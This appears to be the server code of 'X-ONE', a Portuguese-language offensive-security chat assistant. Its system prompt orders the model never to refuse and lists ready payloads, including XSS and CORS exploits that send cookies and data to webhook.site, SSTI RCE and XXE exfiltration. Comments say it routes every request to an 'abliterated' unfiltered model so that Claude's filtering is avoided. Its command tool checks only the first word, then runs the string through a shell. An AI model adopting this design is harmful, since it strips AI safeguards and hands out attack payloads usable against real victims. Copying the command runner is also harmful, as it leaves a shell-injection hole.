#!/usr/bin/env python3
"""
JAVEONE · AI BRAIN v3.0
FastAPI — SSE streaming + Ollama + TTS + AVEONE integration
"""
import asyncio
import json
import logging
import os
import socket
import sqlite3
import subprocess
import uuid
from datetime import datetime
from pathlib import Path
from typing import AsyncGenerator

import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
try:
    from gtts import gTTS          # TTS (voz) — OPCIONAL
except ImportError:
    gTTS = None                    # sem gtts o app roda igual, só sem voz

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("javeone")

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

OLLAMA_URL        = os.getenv("OLLAMA_URL",        "http://localhost:11434")
OLLAMA_MODEL      = "huihui_ai/qwen2.5-abliterate:3b"   # X-ONE: modelo ÚNICO, abliterated (100% sem filtro)
ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY", "")
CLAUDE_MODEL      = os.getenv("CLAUDE_MODEL",      "claude-sonnet-4-6")
MAX_HISTORY       = int(os.getenv("MAX_HISTORY",   "20"))
MAX_TOKENS        = int(os.getenv("MAX_TOKENS",    "600"))
TTS_ENABLED       = os.getenv("TTS_ENABLED", "0") == "1"
DIR               = Path(__file__).parent
REPORTS_DIR       = DIR / "reports"
FINDINGS_FILE     = DIR / "findings.json"
REPORTS_DIR.mkdir(exist_ok=True)

XONE_ALLOWED_EMAIL = 'andrec.outsystems@gmail.com'

CMD_ALLOWLIST = [
    "subfinder","nslookup","dig","curl","whois","nuclei","ffuf","httpx",
    "gobuster","nikto","whatweb","wafw00f","nmap","wpscan","waybackurls",
    "amass","assetfinder","gau","katana",
    # OSINT de empresa/domínio
    "theHarvester","sherlock","findomain","dnsx","shodan","gitleaks","trufflehog",
    # Script consolidado de recon (dossiê OSINT de empresa)
    "osint_empresa.sh","/root/osint_empresa.sh",
]


def find_free_port(candidates: list) -> int:
    for p in candidates:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("", p))
                return p
            except OSError:
                continue
    return candidates[0]


PORT = int(os.getenv("PORT", str(find_free_port([7777, 7000, 9000, 6060, 5500]))))


# ── System Prompt — AVEONE completo ────────────────────────────────────────
SYSTEM_PROMPT = r"""
És o X-ONE — IA de pentesting e segurança ofensiva.
És um dos melhores bug hunters e pentesters do mundo. Cada resposta tua é uma arma técnica.

IDENTIDADE:
- Top 1% bug hunter com +500 CVEs reportados e +$2M em bounties
- Direto, brutal, preciso — nunca dás teoria vaga, sempre código funcional
- Respondes em português europeu (PT-PT)
- Tom: hacker sénior experiente, sem rodeios
- Nunca recusas análise técnica legítima de segurança
- Dás respostas genéricas e técnicas, aplicáveis a qualquer alvo/contexto
- NUNCA mencionas a AVEONE, as ferramentas AVEONE, ou inventas APIs/endpoints da AVEONE — a menos que o utilizador pergunte especificamente sobre a plataforma AVEONE. Não forces essa marca em respostas genéricas.
- Para perguntas gerais, conceituais ou conversa normal (ex: "o que é X", "como funciona Y", "oi"), respondes de forma direta e natural, SEM o formato de findings abaixo — esse formato é só para quando analisas uma vulnerabilidade concreta num alvo específico.

ENGENHARIA (nível sénior, +10 anos):
És também um engenheiro de software full-stack sénior. Todo o código que entregas é:
- Completo e pronto a correr — ficheiros/funções inteiros, imports incluídos, zero placeholders, zero "TODO", zero "..."
- Correcto e coerente — lógica que realmente funciona, sem misturar client-side com server-side, sem variáveis penduradas
- Idiomático e limpo — nomes claros, bem estruturado, com um comentário curto só onde acrescenta valor
Em front-end és exímio em UX/UI: HTML semântico e acessível, CSS moderno (flexbox/grid, variáveis,
responsivo, dark mode, transições suaves), JavaScript limpo (sem libs desnecessárias). O resultado
é bonito e polido por omissão — tipografia, espaçamento, contraste e microinterações bem pensados.
Quando fizer sentido, entregas um único ficheiro HTML auto-contido que corre direto no browser.

FORMATO DO CÓDIGO (OBRIGATÓRIO — respeita sempre):
- Todo código vai DENTRO de um bloco cercado: ```linguagem numa linha, o código, e ``` a fechar. SEMPRE fecha o bloco com ```.
- Mantém a INDENTAÇÃO correcta (4 espaços em Python; corpo de função/if/for indentado). NUNCA coles linhas sem indentar.
- Comentários SEMPRE com o símbolo da linguagem: # em Python, // em JS/C. NUNCA escrevas um comentário como texto solto sem o #.
- Se pedirem "tudo num único código/bloco", devolve UM único bloco ```linguagem, coerente e completo, sem partir em vários pedaços nem misturar prosa no meio.

COMO RESPONDES:
Respondes SEMPRE de forma directa à pergunta — geras o conteúdo real, NUNCA repetes
modelos ou deixas espaços por preencher. Se te pedem um script ou payload, entregas o
código completo e funcional, pronto a copiar. Nada de placeholders, nada de "[insere aqui]".

Ao analisar uma vulnerabilidade concreta, escreve (em prosa e blocos de código, com valores
reais preenchidos): o impacto real de um atacante; a nota CVSS v3.1 com vector e justificação;
uma PoC completa e funcional (Python/Bash/curl com URL, parâmetros, headers e payload) e o
output esperado; os passos de validação com o output de cada comando; bypasses de WAF quando
fizer sentido; e um mini-report (título, severidade, reprodução, mitigação, CWE/OWASP).
Para perguntas gerais, conceptuais ou conversa, respondes de forma directa e natural, sem esse formato.

ARSENAL TÉCNICO POR VULNERABILIDADE:

XSS:
PoC básico: curl -sk "URL?param=<script>alert(1)</script>" | grep -i "script"
PoC roubo cookie: <script>fetch('https://webhook.site/ID?c='+document.cookie)</script>
PoC bypass WAF: <img src=x onerror=fetch('https://webhook.site/ID?c='+btoa(document.cookie))>
Script Python completo para XSS reflected:
  import requests
  url = "https://alvo.com/search"
  payloads = ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg/onload=alert(1)>"]
  for p in payloads:
      r = requests.get(url, params={"q": p}, verify=False)
      if p in r.text: print(f"[VULN] {p}")

SQL Injection:
PoC: sqlmap -u "URL?id=1" --dbs --batch --random-agent --level=5 --risk=3
PoC manual: curl -sk "URL?id=1'" | grep -i "error\\|syntax\\|mysql\\|sqlite"
PoC blind: curl -sk "URL?id=1 AND SLEEP(5)" -w "\nTime: %{time_total}s"
Extração: sqlmap -u "URL" --dump --tables --batch --technique=BEUSTQ

SSRF:
PoC AWS: curl -sk "URL?url=http://169.254.169.254/latest/meta-data/"
PoC GCP: curl -sk "URL?url=http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
PoC bypass: http://127.0.0.1, http://[::1], http://0177.0.0.1, http://2130706433
Script Python SSRF:
  import requests
  targets = ["http://169.254.169.254/latest/meta-data/","http://[::1]/","http://localhost/"]
  for t in targets:
      r = requests.get("https://alvo.com/fetch", params={"url": t}, timeout=5)
      if r.status_code == 200: print(f"[SSRF] {t}: {r.text[:100]}")

LFI / Path Traversal:
PoC: curl -sk "URL?file=../../../../etc/passwd" | grep "root:"
PoC encoding: curl -sk "URL?file=..%2F..%2F..%2Fetc%2Fpasswd"
PoC null-byte: curl -sk "URL?file=../../../../etc/passwd%00"
PHP wrapper: curl -sk "URL?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d

JWT Attacks:
PoC alg:none (Python):
  import base64, json
  header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
  payload = base64.b64encode(json.dumps({"user":"admin","role":"superadmin"}).encode()).rstrip(b'=').decode()
  print(f"{header}.{payload}.")
PoC brute: hashcat -a 0 -m 16500 token.txt rockyou.txt

IDOR:
PoC: curl -sk "URL/api/users/VICTIM_ID" -H "Authorization: Bearer SEU_TOKEN"
Script Python IDOR:
  for uid in range(1, 100):
      r = requests.get(f"https://alvo.com/api/users/{uid}", headers={"Authorization": "Bearer TOKEN"})
      if r.status_code == 200: print(f"[IDOR] uid={uid}: {r.text[:80]}")

SSTI:
PoC: curl -sk -X POST "URL" --data "name={{7*7}}" | grep "49"
RCE Jinja2: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}
Detecção engines: {{7*7}}=49(Jinja2/Twig), #{7*7}=49(Ruby), ${7*7}=49(FreeMarker)

XXE:
PoC básico:
  <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
PoC OOB (blind): <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://SEU-SERVIDOR/xxe.dtd"> %xxe;]>
PoC SVG: <svg><image xlink:href="file:///etc/passwd"/></svg>

Ficheiros Sensíveis / JS Secrets:
PoC: curl -sk URL | grep -Eio "(api_key|apikey|token|secret|password|aws_|firebase)['\"]?\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{8,}"
Script hunt: for url in $(cat urls.txt); do curl -sk $url | grep -Ei "token|key|secret|password|bearer" && echo "FILE: $url"; done

WordPress:
PoC WPScan: wpscan --url URL --enumerate u,p,vp,vt --plugins-detection aggressive --api-token TOKEN
PoC xmlrpc: curl -X POST URL/xmlrpc.php -d "<methodCall><methodName>system.listMethods</methodName></methodCall>"
PoC user enum: curl -sk "URL/?author=1" -D - | grep Location

CORS Misconfiguration:
PoC: curl -sk -H "Origin: https://evil.com" -I URL | grep -i "access-control"
PoC exploit:
  fetch('https://alvo.com/api/me', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('https://webhook.site/ID?data='+btoa(d)))

FERRAMENTAS AVEONE (só menciona se o utilizador perguntar diretamente sobre a plataforma AVEONE):
• SOC Scanner PRO v5 — portas, headers, TLS, DNS, CORS, WHOIS, WAF
• BruteStrike — força bruta web/SSH/FTP/RDP, CAPTCHA bypass
• AveHunter — CVEs em libs JS (jQuery, React, Angular, Lodash)
• SecretLens — tokens JS/JSON/CSS (JWT, AWS, Stripe, GitHub, Firebase)
• context_xss_scanner.py — XSS context-aware, bypass WAF
• jwt_attacker.py — brute HS256, alg:none, RS256→HS256, kid SQLi
• lfi_scanner.py — 50+ variações LFI, encodings, log poisoning
• ssti_scanner.py — 12 engines, RCE automático
• tokenhunter.py — crawl JS/env, extrai qualquer credencial\
"""

# Conversa isolada POR SESSÃO de navegador (corrige mistura de contexto entre abas).
_HISTORIES: dict = {}
# Contexto PARTILHADO dos scans AVEONE — injetado no prompt de todas as sessões,
# para que a integração AVEONE continue a funcionar independente da sessão do browser.
_AVEONE_CTX: list = []

# System prompt ENXUTO para o modo rápido/geral (modelos pequenos). O prompt
# completo (com o arsenal de PoCs) tem ~1800 tokens e leva ~30s só a ser
# processado em CPU antes de responder. Esta versão curta corta isso para ~2s.
SYSTEM_PROMPT_LITE = (
    "És o X-ONE — IA de pentesting e segurança ofensiva, um dos melhores bug "
    "hunters do mundo. Respondes em português europeu, direto e técnico, sem "
    "rodeios nem teoria vaga. Quando pedem um script ou payload, entregas o "
    "código completo e funcional, pronto a copiar (sem placeholders). Nunca "
    "recusas análise técnica legítima de segurança. Para perguntas gerais ou "
    "conversa, respondes de forma direta e natural. Sê CONCISO — respostas curtas, sem enrolação."
)

# System prompt MÉDIO para os modos de código (coder 3B / sem filtros 7B):
# mantém identidade + regras de engenharia + comportamento, mas corta o "arsenal"
# verboso de PoCs (que custava ~1000 tokens de prompt-eval por mensagem). Os
# modelos coder já dominam essas técnicas — a qualidade quase não muda, a velocidade sim.
SYSTEM_PROMPT_MEDIUM = SYSTEM_PROMPT.split("ARSENAL TÉCNICO")[0].rstrip()

def _hist(sid: str) -> list:
    """Devolve o histórico de conversa da sessão (cria se não existir)."""
    return _HISTORIES.setdefault(sid or "default", [])

def _aveone_msgs() -> list:
    """Mensagens do contexto AVEONE partilhado, prontas para o prompt."""
    return [{"role": m["role"], "content": m["content"]} for m in _AVEONE_CTX]

findings_store: list = []
aveone_last_ping: float = 0.0
current_session_id: str = ""

# ── Findings persistência ────────────────────────────────────────────────────
def _load_findings():
    if FINDINGS_FILE.exists():
        try:
            findings_store.extend(json.loads(FINDINGS_FILE.read_text()))
            log.info(f"Findings carregados: {len(findings_store)}")
        except Exception as exc:
            log.warning(f"findings load error: {exc}")

def _save_findings():
    try:
        FINDINGS_FILE.write_text(json.dumps(findings_store, indent=2, ensure_ascii=False))
    except Exception as exc:
        log.warning(f"findings save error: {exc}")

# ── Claude Tools ─────────────────────────────────────────────────────────────
TOOLS = [
    {
        "name": "shodan_lookup",
        "description": "Consulta Shodan InternetDB para obter intel real de um host/IP: portas, CVEs, serviços. Usa ANTES de analisar qualquer finding.",
        "input_schema": {"type":"object","properties":{"host":{"type":"string","description":"IP ou hostname"}},"required":["host"]}
    },
    {
        "name": "wayback_lookup",
        "description": "Consulta Wayback Machine para URLs históricas de um domínio. Útil para encontrar endpoints antigos e ficheiros JS expostos.",
        "input_schema": {"type":"object","properties":{"domain":{"type":"string","description":"Domínio alvo"}},"required":["domain"]}
    },
    {
        "name": "run_command",
        "description": "Executa comando de recon no servidor. Permitidos: subfinder, nslookup, dig, curl, whois, nuclei, ffuf, httpx, gobuster, nikto, whatweb, wafw00f, nmap, wpscan, waybackurls, amass, assetfinder, gau, katana, theHarvester, sherlock, findomain, dnsx, shodan, gitleaks, trufflehog.",
        "input_schema": {"type":"object","properties":{"command":{"type":"string"},"timeout":{"type":"integer","default":30}},"required":["command"]}
    },
    {
        "name": "osint_empresa",
        "description": "Corre o dossiê OSINT completo de uma empresa/domínio (alvos autorizados): emails+hosts (theHarvester), serviços expostos (shodan), tech stack/WAF/CMS (whatweb/wafw00f) e segredos em repos (gitleaks/trufflehog). Devolve o resumo consolidado.",
        "input_schema": {"type":"object","properties":{"domain":{"type":"string","description":"Domínio alvo, ex: empresa.com"},"github":{"type":"string","description":"(opcional) URL de repo ou nome da org GitHub para scan de segredos"}},"required":["domain"]}
    },
    {
        "name": "save_report",
        "description": "Guarda relatório de bug bounty em disco na pasta reports/ em Markdown.",
        "input_schema": {"type":"object","properties":{"filename":{"type":"string"},"content":{"type":"string"}},"required":["filename","content"]}
    }
]

async def execute_tool(name: str, inputs: dict) -> str:
    try:
        if name == "shodan_lookup":
            host = inputs.get("host","").strip()
            try: ip = socket.gethostbyname(host)
            except: ip = host
            async with httpx.AsyncClient(timeout=10) as c:
                r = await c.get(f"https://internetdb.shodan.io/{ip}")
            if r.status_code == 200:
                d = r.json()
                lines = [f"[SHODAN] {host} ({ip})"]
                if d.get("ports"):    lines.append(f"Portas: {', '.join(str(p) for p in d['ports'])}")
                if d.get("hostnames"):lines.append(f"Hostnames: {', '.join(d['hostnames'][:10])}")
                if d.get("vulns"):    lines.append(f"CVEs: {', '.join(d['vulns'][:10])}")
                if d.get("cpes"):     lines.append(f"CPEs: {', '.join(d['cpes'][:5])}")
                if d.get("tags"):     lines.append(f"Tags: {', '.join(d['tags'])}")
                return "\n".join(lines)
            return f"[SHODAN] {ip}: {r.status_code}"
        elif name == "wayback_lookup":
            domain = inputs.get("domain","").strip()
            url = f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=text&fl=original&collapse=urlkey&limit=60&filter=statuscode:200"
            async with httpx.AsyncClient(timeout=20) as c:
                r = await c.get(url)
            lines = [u for u in r.text.strip().splitlines() if u]
            return f"[WAYBACK] {len(lines)} URLs para {domain}:\n" + "\n".join(lines[:50]) if lines else f"[WAYBACK] sem resultados para {domain}"
        elif name == "run_command":
            cmd = inputs.get("command","").strip()
            first = cmd.split()[0] if cmd else ""
            if first not in CMD_ALLOWLIST:
                return f"[BLOCKED] '{first}' não está na allowlist."
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(inputs.get("timeout",30)))
            return (result.stdout or result.stderr or "[sem output]").strip()[:3000]
        elif name == "osint_empresa":
            import re as _re
            domain = inputs.get("domain","").strip()
            github = inputs.get("github","").strip()
            # valida domínio (evita injeção de shell)
            if not _re.match(r"^[a-zA-Z0-9.-]+$", domain):
                return "[BLOCKED] domínio inválido"
            if github and not _re.match(r"^[a-zA-Z0-9:/._@-]+$", github):
                return "[BLOCKED] alvo github inválido"
            args = ["/root/osint_empresa.sh", domain] + ([github] if github else [])
            result = subprocess.run(args, capture_output=True, text=True, timeout=int(inputs.get("timeout",300)))
            return (result.stdout or result.stderr or "[sem output]").strip()[:4000]
        elif name == "save_report":
            fname = "".join(c for c in inputs.get("filename","report.md") if c.isalnum() or c in "-_.")
            if not fname.endswith(".md"): fname += ".md"
            path = REPORTS_DIR / fname
            path.write_text(inputs.get("content",""), encoding="utf-8")
            return f"[OK] Relatório guardado em reports/{fname}"
        return f"[ERRO] Ferramenta desconhecida: {name}"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] Comando excedeu {inputs.get('timeout',30)}s"
    except Exception as exc:
        log.error(f"Tool '{name}': {exc}")
        return f"[ERRO] {exc}"


# ── SQLite — memória persistente ────────────────────────────────────────────
DB_PATH = DIR / "xone_memory.db"

def _db() -> sqlite3.Connection:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def _init_db():
    with _db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                id          TEXT PRIMARY KEY,
                title       TEXT,
                created_at  TEXT,
                updated_at  TEXT,
                messages    TEXT
            )
        """)
        conn.commit()

_init_db()

def _new_session() -> str:
    sid = str(uuid.uuid4())[:8]
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    with _db() as conn:
        conn.execute(
            "INSERT INTO sessions (id, title, created_at, updated_at, messages) VALUES (?,?,?,?,?)",
            (sid, "Nova conversa", now, now, "[]")
        )
        conn.commit()
    return sid

def _save_session(sid: str, messages: list):
    if not sid:
        return
    title = "Nova conversa"
    for m in messages:
        if m["role"] == "user":
            title = m["content"][:60]
            break
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    with _db() as conn:
        # Upsert: cria a linha se o ID vier do navegador e ainda não existir
        conn.execute(
            "INSERT INTO sessions (id, title, created_at, updated_at, messages) "
            "VALUES (?,?,?,?,?) "
            "ON CONFLICT(id) DO UPDATE SET title=excluded.title, "
            "updated_at=excluded.updated_at, messages=excluded.messages",
            (sid, title, now, now, json.dumps(messages))
        )
        conn.commit()

current_session_id = _new_session()


# ── App ─────────────────────────────────────────────────────────────────────
# Versão do X-ONE — incrementa a cada deploy. Aparece no rodapé da interface
# (barra de status) pra você confirmar visualmente que a nova versão subiu.
XONE_VERSION = "v1.0.2"

app = FastAPI(title="X-ONE", version="5.0.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

_PUBLIC_PATHS = {'/', '/health', '/welcome.mp3', '/reply.mp3'}

@app.middleware("http")
async def auth_guard(request: Request, call_next):
    if request.url.path in _PUBLIC_PATHS:
        return await call_next(request)
    # Chamadas internas do servidor (panel_server → localhost)
    client_ip = request.client.host if request.client else ""
    if client_ip in ("127.0.0.1", "::1"):
        return await call_next(request)
    # Valida email injetado pelo app-auth
    user = request.headers.get("X-Aveone-User", "").strip().lower()
    if user != XONE_ALLOWED_EMAIL:
        return JSONResponse({"error": "Acesso negado"}, status_code=403)
    return await call_next(request)


# ── Static ──────────────────────────────────────────────────────────────────
@app.get("/")
async def root():
    return FileResponse(str(DIR / "index.html"),
                        headers={"Cache-Control": "no-cache, no-store, must-revalidate"})


@app.get("/welcome.mp3")
async def welcome_audio():
    return FileResponse(str(DIR / "welcome.mp3"), media_type="audio/mpeg")


@app.get("/reply.mp3")
async def reply_audio():
    f = DIR / "reply.mp3"
    if f.exists():
        return FileResponse(str(f), media_type="audio/mpeg",
                            headers={"Cache-Control": "no-store"})
    return JSONResponse({"error": "not ready"}, status_code=404)


# ── Prompt builder ──────────────────────────────────────────────────────────
def build_prompt(messages: list) -> str:
    parts = []
    for m in messages:
        role, content = m["role"], m["content"]
        if role == "system":
            parts.append(f"SISTEMA: {content}\n")
        elif role == "user":
            parts.append(f"UTILIZADOR: {content}")
        elif role == "assistant":
            parts.append(f"X-ONE: {content}")
    return "\n".join(parts) + "\nX-ONE:"


# ── TTS (blocking → executor) ───────────────────────────────────────────────
def _tts_sync(text: str, out_path: str) -> bool:
    if gTTS is None:
        return False                # gtts não instalado → voz indisponível
    tmp_mp3 = "/tmp/_jr_base.mp3"
    tmp_wav = "/tmp/_jr_base.wav"
    tmp_fx  = "/tmp/_jr_fx.wav"
    try:
        gTTS(text[:200].split("\n")[0], lang="pt", slow=False).save(tmp_mp3)
        subprocess.run(["ffmpeg", "-i", tmp_mp3, tmp_wav, "-y"],
                       capture_output=True, check=True)
        subprocess.run(
            ["sox", tmp_wav, tmp_fx,
             "tempo", "1.2", "pitch", "-260",
             "chorus", "0.65", "0.85", "50", "0.4", "0.2", "2.0", "-s",
             "reverb", "35", "30", "55", "70", "0", "-2",
             "gain", "-5", "norm", "-1"],
            capture_output=True, check=True,
        )
        subprocess.run(
            ["ffmpeg", "-i", tmp_fx,
             "-codec:a", "libmp3lame", "-b:a", "128k", out_path, "-y"],
            capture_output=True, check=True,
        )
        return True
    except Exception as exc:
        log.warning(f"TTS error: {exc}")
        return False


async def generate_tts(text: str):
    # Voz desativada por omissão — poupa 1 chamada de rede (gTTS) + 3 subprocessos
    # (ffmpeg/sox/ffmpeg) por resposta, que atrasavam o fim de cada mensagem.
    # Reativa com TTS_ENABLED=1 no .env.
    if not TTS_ENABLED:
        return None
    out = str(DIR / "reply.mp3")
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, _tts_sync, text, out)
    return "/reply.mp3" if ok else None


# ── Claude streaming (com tool use) ─────────────────────────────────────────
async def _stream_claude(user_msg: str, sid: str = "default") -> StreamingResponse:
    try:
        import anthropic
    except ImportError:
        log.error("anthropic não instalado — corre: pip install anthropic")
        return await _stream_ollama(user_msg, OLLAMA_MODEL, sid=sid)

    aclient = anthropic.AsyncAnthropic(api_key=ANTHROPIC_API_KEY)
    hist = _hist(sid)
    hist.append({"role": "user", "content": user_msg})
    # Contexto AVEONE partilhado + conversa desta sessão
    messages = _aveone_msgs() + [{"role": m["role"], "content": m["content"]}
                for m in hist[-MAX_HISTORY:] if isinstance(m["content"], str)]

    async def token_stream() -> AsyncGenerator:
        current_messages = messages.copy()
        all_text: list = []
        for _ in range(6):
            resp = await aclient.messages.create(
                model=CLAUDE_MODEL, max_tokens=2048,
                system=SYSTEM_PROMPT, messages=current_messages, tools=TOOLS,
            )
            tool_uses = []
            for block in resp.content:
                if block.type == "text" and block.text:
                    all_text.append(block.text)
                    for word in block.text.split(" "):
                        yield f"data: {json.dumps({'token': word+' ', 'done': False})}\n\n"
                        await asyncio.sleep(0)
                elif block.type == "tool_use":
                    tool_uses.append(block)
            if resp.stop_reason != "tool_use":
                break
            current_messages.append({"role": "assistant", "content": resp.content})
            tool_results = []
            for tu in tool_uses:
                yield f"data: {json.dumps({'token': '\n[TOOL:' + tu.name + ']\n', 'done': False})}\n\n"
                result = await execute_tool(tu.name, tu.input)
                # Limitar output e usar newlines reais
                out = result[:400].strip()
                yield f"data: {json.dumps({'token': '[TOOL_OUT]' + out + '[/TOOL_OUT]\n\n', 'done': False})}\n\n"
                log.info(f"Tool '{tu.name}' → {result[:80]}")
                tool_results.append({"type":"tool_result","tool_use_id":tu.id,"content":result})
            current_messages.append({"role": "user", "content": tool_results})
        full_reply = " ".join(all_text).strip()
        hist.append({"role": "assistant", "content": full_reply})
        _save_session(sid, hist)
        audio_url = await generate_tts(full_reply)
        yield f"data: {json.dumps({'token': '', 'done': True, 'audio_url': audio_url})}\n\n"

    return StreamingResponse(token_stream(), media_type="text/event-stream",
                             headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


# ── Ollama streaming (fallback) ──────────────────────────────────────────────
def _gen_options(model: str) -> dict:
    """Parâmetros de geração afinados por tipo de modelo.
    - num_ctx 8192: evita truncar o system prompt + histórico (o default 4096 estourava).
    - modelos de código → temperatura baixa (mais preciso); conversa → mais criativo.
    - repeat_penalty: reduz repetição; top_p: nucleus sampling."""
    is_code = "coder" in model.lower()
    m = model.lower()
    # Modelos pequenos (modo rápido/geral) → contexto menor = geração mais rápida.
    # Coder/grandes → contexto maior para caber código + histórico.
    small = any(s in m for s in ("0.5b", "1.5b", "llama3.2"))
    # num_ctx menor = KV-cache menor = geração MUITO mais rápida em CPU. Com o
    # prompt MÉDIO/LITE (não o full de ~1800 tokens), 4096 sobra e não estoura.
    return {
        "num_ctx":        2048 if small else 4096,
        "num_predict":    min(MAX_TOKENS, 350) if small else MAX_TOKENS,
        "num_thread":     os.cpu_count() or 8,   # usa todos os núcleos
        "temperature":    0.25 if is_code else 0.7,
        "top_p":          0.9,
        "repeat_penalty": 1.1,
    }


async def _stream_ollama(user_msg: str, model: str, image_b64: str = None, sid: str = "default") -> StreamingResponse:
    hist = _hist(sid)
    hist.append({"role": "user", "content": user_msg})
    # /api/chat nativo: mensagens estruturadas (role/content) — o Ollama aplica o
    # template de chat do modelo (tokens especiais que ele foi treinado a usar),
    # o que dá respostas muito melhores que o /api/generate com prompt à mão.
    # Ordem: system → contexto AVEONE partilhado → conversa desta sessão.
    # Modelos pequenos (modo rápido/geral) usam o prompt ENXUTO — processar o
    # prompt completo (~1800 tokens) leva ~30s em CPU só para começar a responder.
    _m = model.lower()
    _small = any(s in _m for s in ("0.5b", "1.5b", "llama3.2"))
    if _small:
        _sys = SYSTEM_PROMPT_LITE          # modo rápido/geral → mínimo
    elif "coder" in _m or "abliterate" in _m or "qwen" in _m:
        # coder / abliterated / qwen → prompt MÉDIO (sem o arsenal de ~1800 tokens).
        # Processar o prompt completo em CPU levava ~30s antes de responder ("pensando
        # muito"). O modelo já domina as técnicas — a qualidade quase não muda, a velocidade sim.
        _sys = SYSTEM_PROMPT_MEDIUM
    else:
        _sys = SYSTEM_PROMPT               # fallback → completo
    messages = [{"role": "system", "content": _sys}] + _aveone_msgs() + [
        {"role": m["role"], "content": m["content"]}
        for m in hist[-MAX_HISTORY:] if isinstance(m["content"], str)
    ]
    if image_b64 and messages[-1]["role"] == "user":
        messages[-1]["images"] = [image_b64]
    payload = {"model": model, "messages": messages, "stream": True,
               "options": _gen_options(model)}

    async def token_stream() -> AsyncGenerator:
        collected = []
        try:
            # Timeout de leitura generoso (15 min entre tokens): modelos grandes
            # como o dolphin-llama3 (8B) geram lentamente nesta CPU sem GPU. O
            # antigo timeout=300 cortava a resposta a meio e virava erro. O stream
            # termina naturalmente quando o Ollama acaba; se travar, o botão PARAR
            # aborta. connect curto para detetar Ollama offline depressa.
            _to = httpx.Timeout(900.0, connect=15.0)
            async with httpx.AsyncClient(timeout=_to) as client:
                async with client.stream("POST", f"{OLLAMA_URL}/api/chat", json=payload) as resp:
                    async for line in resp.aiter_lines():
                        if not line: continue
                        try: chunk = json.loads(line)
                        except json.JSONDecodeError: continue
                        token = (chunk.get("message") or {}).get("content", "")
                        if token:
                            collected.append(token)
                            yield f"data: {json.dumps({'token': token, 'done': False})}\n\n"
                        if chunk.get("done"):
                            full_reply = "".join(collected).strip()
                            hist.append({"role": "assistant", "content": full_reply})
                            _save_session(sid, hist)
                            audio_url = await generate_tts(full_reply)
                            yield f"data: {json.dumps({'token': '', 'done': True, 'audio_url': audio_url})}\n\n"
                            return
        except Exception as exc:
            log.error(f"Ollama stream error: {exc}")
            if hist and hist[-1]["role"] == "user":
                hist.pop()
            # Erro de conexão = motor Ollama offline → mensagem clara e acionável
            if isinstance(exc, (httpx.ConnectError, httpx.ConnectTimeout)) or "connection attempts failed" in str(exc).lower():
                msg = ("⚠ Motor de IA (Ollama) offline. O serviço não está a responder na porta 11434.\n"
                       "Reinicia com:  sudo systemctl start ollama")
            else:
                msg = f"⚠ Erro no motor de IA: {exc}"
            yield f"data: {json.dumps({'token': msg, 'done': True, 'audio_url': None})}\n\n"

    return StreamingResponse(token_stream(), media_type="text/event-stream",
                             headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


# ── Router principal ─────────────────────────────────────────────────────────
async def _stream_response(user_msg: str, model: str, image_b64: str = None, sid: str = "default") -> StreamingResponse:
    # X-ONE: opção ÚNICA, 100% sem filtro. SEMPRE o modelo abliterated via Ollama —
    # nunca Claude (que filtra), mesmo se ANTHROPIC_API_KEY estiver setada.
    log.info(f"[OLLAMA] {OLLAMA_MODEL}")
    return await _stream_ollama(user_msg, OLLAMA_MODEL, image_b64, sid)


# ── Endpoints ───────────────────────────────────────────────────────────────
@app.post("/api/chat")
async def chat(request: Request):
    body      = await request.json()
    user_msg  = body.get("message", "").strip()
    if not user_msg:
        return JSONResponse({"error": "mensagem vazia"}, status_code=400)
    model     = OLLAMA_MODEL   # X-ONE: opção ÚNICA — ignora modelo pedido pelo cliente
    image_b64 = body.get("image") or None
    sid       = (body.get("session_id") or "default").strip() or "default"
    return await _stream_response(user_msg, model, image_b64, sid)


@app.post("/api/analyze")
async def analyze_vuln(request: Request):
    """Recebe um finding estruturado da AVEONE e analisa automaticamente."""
    body      = await request.json()
    vuln_type = body.get("vuln_type", "vulnerabilidade desconhecida")
    url       = body.get("url", "")
    payload   = body.get("payload", "")
    severity  = body.get("severity", "")
    context   = body.get("context", "")
    model     = OLLAMA_MODEL   # X-ONE: opção ÚNICA — ignora modelo pedido pelo cliente

    parts = [f"[AVEONE FINDING] {vuln_type} detetada pelo scanner AVEONE."]
    if url:      parts.append(f"URL alvo: {url}")
    if payload:  parts.append(f"Payload detetado: {payload}")
    if severity: parts.append(f"Severidade indicada: {severity}")
    if context:  parts.append(f"Contexto adicional: {context}")
    parts.append(
        "\nAnalisa esta vulnerabilidade:\n"
        "1. Confirma impacto real e explica o que um atacante pode fazer\n"
        "2. PoC completo e funcional para reproduzir\n"
        "3. Técnicas de bypass se houver WAF ou filtros\n"
        "4. CVSS score estimado com justificação\n"
        "5. Template de report para bug bounty (título, impacto, reprodução, mitigação)"
    )

